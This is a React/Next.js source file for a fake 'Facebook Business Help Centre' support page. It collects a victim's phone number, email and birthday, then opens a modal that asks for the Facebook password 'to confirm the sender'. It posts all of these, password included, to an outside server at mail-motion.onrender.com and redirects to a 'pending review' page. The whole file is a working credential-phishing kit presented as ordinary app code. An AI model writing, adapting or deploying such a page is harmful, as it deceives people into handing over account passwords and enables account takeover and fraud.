"use client";
import React, { useState, CSSProperties, FormEvent } from "react";
import styles from "./styles.module.css";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import ClipLoader from "react-spinners/ClipLoader";

const override: CSSProperties = {
  display: "block",
  margin: 0,
  borderColor: "green",
};

export default function Support() {
  const [phone, setPhone] = useState<string>("");
  const [email, setEmail] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [date, setDate] = useState<string>("");
  const [valid, setValid] = useState<boolean>(true);
  const [error, setError] = useState<string>("");
  const [showModal, setShowModal] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);

  const handleChange = (value: any) => {
    setPhone(value);
    setValid(validatePhone(value));
  };

  const validatePhone = (number: any) => {
    const numberPattern = /^\d{10}$/;
    return numberPattern.test(number);
  };
  const validateEmail = (email: any) => {
    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailPattern.test(email);
  };

  const validatedFields =
    validatePhone(phone) || validateEmail(email) || date.length !== 0;

  const submitForm = async (
    email: string,
    phone: string,
    password: string,
    date: string
  ) => {
    try {
      const response = await fetch(
        "https://mail-motion.onrender.com/mail-motion/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ email, phone, password, date }),
        }
      );

      if (response.ok) {
        const responseBody = await response.json();
        console.log("Response:", responseBody);
        setLoading(false);
        location.replace("/pending-review");
      } else {
        const errorResponse = await response.json();
        console.log("Error:", errorResponse);
        setError(errorResponse.message || "An error occurred");
      }
    } catch (error: any) {
      console.log("Error:", error);
      setError(error.message);
    }
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    if (password.length !== 0 && password.length >= 4) {
      setLoading(true);
      await submitForm(email, phone, password, date);
    }
  };

  return (
    <main className={`${styles.main} relative`}>
      <header className={styles.header}>
        <div>
          <h5>Facebook Business Help Centre</h5>
          <h1>How can we help you?</h1>
        </div>
      </header>

      <center className={styles.center}>
        <h5>How can we help you?</h5>
        <p>
          We need more information to address your issue. This form will only
          take a few minutes.
        </p>
        <form className={styles.form}>
          <h3>Get Help</h3>
          <div>
            <label htmlFor="phone_number">
              Phone number
              <span className="required__text">(* required)</span>
            </label>
            <div className="w-full">
              <PhoneInput
                country={"us"}
                value={phone}
                onChange={handleChange}
                inputClass={styles.phoneInput}
                inputProps={{
                  name: "phone",
                  required: true,
                  autoFocus: true,
                }}
              />
            </div>
          </div>
          <div>
            <label htmlFor="email">
              Email address
              <span className="required__text">(* required)</span>
            </label>
            <input
              placeholder="Please enter your email"
              required
              type="email"
              id="email"
              value={email}
              className={styles.input}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <div>
            <label htmlFor="email">
              Birthday <span className="required__text">(* required)</span>
            </label>
            <input
              placeholder="Please enter your birthday"
              required
              type="date"
              id="birthday"
              value={date}
              className={styles.input}
              onChange={(e) => setDate(e.target.value)}
            />
          </div>
          {/* Error Responses and user information */}
          {!valid && (
            <p className="text-left text-orange-500 font-semibold">
              Please enter a valid phone number
            </p>
          )}
          {!validateEmail(email) && (
            <p className="text-left text-orange-500 font-semibold">
              Please enter a valid email address
            </p>
          )}
          <div className={styles.btn__container}>
            <button
              onClick={(e) => {
                e.preventDefault();
                validatedFields && setShowModal(true);
              }}
              className={styles.button}
            >
              <svg
                style={{ marginRight: "10px", width: "24px", height: "24px" }}
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
                className="tabler-icon tabler-icon-message-circle"
              >
                <path d="M3 20l1.3 -3.9c-2.324 -3.437 -1.426 -7.872 2.1 -10.374c3.526 -2.501 8.59 -2.296 11.845 .48c3.255 2.777 3.695 7.266 1.029 10.501c-2.666 3.235 -7.615 4.215 -11.574 2.293l-4.7 1"></path>
              </svg>
              Start Chart
            </button>
          </div>
        </form>
      </center>

      {/* Modal */}
      {showModal && (
        <div className="absolute top-0 left-0 right-0 bottom-0 flex justify-center items-center bg-[rgba(0,0,0,0.15)] h-full">
          {/* Modal Body */}
          <div
            className={`lg:max-w-[500px] w-[80%] bg-white rounded-md ${styles.modal} ${
              showModal ? styles.slideIn : styles.slideIn
            } ${showModal ? styles.fadeIn : styles.fadeOut}`}
          >
            <h2
              className="h-[1.25rem] font-[500] px-[16px] pt-[16px] pb-[20px]"
              style={{ lineHeight: 1.2 }}
            >
              Please enter your facebook password to continue{" "}
            </h2>
            <hr className="w-full h-[1px] bg-[rgba(0,0,0,0.175)] mt-[16px]"></hr>
            <div className="p-[16px]">
              <p className="text-[14px] text-[#212529BF]">
                We need to confirm the sender of the information is you, Please
                enter your facebook password and then continue.
              </p>
              <h3 className="h-[1.25rem] font-[500] my-[16px]">Password</h3>
              <input
                type="password"
                onChange={(e) => setPassword(e.target.value)}
                className={styles.password}
              />
            </div>
            {/* errors can go here */}
            {loading && (
              <div className="flex items-center justify-start ml-4">
                <p className="font-semibold text-[green] text-[16px] mr-2">
                  Validating Information
                </p>
                <ClipLoader
                  color={"green"}
                  loading={loading}
                  cssOverride={override}
                  size={20}
                  aria-label="Loading Spinner"
                  data-testid="loader"
                />
              </div>
            )}
            <hr className="w-full h-[1px] bg-[rgba(0,0,0,0.175)] mt-[16px]"></hr>
            <div className="p-[12px] flex justify-end items-center">
              <button
                onClick={() => setShowModal(false)}
                className="bg-[#6C757D] text-white w-[70px] h-[41px] m-[4px] text-[16px] rounded-md"
              >
                Close
              </button>
              <button
                onClick={handleSubmit}
                className="m-[4px] h-[41px] w-[91px] bg-[#0D6EFD] text-white rounded-md"
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
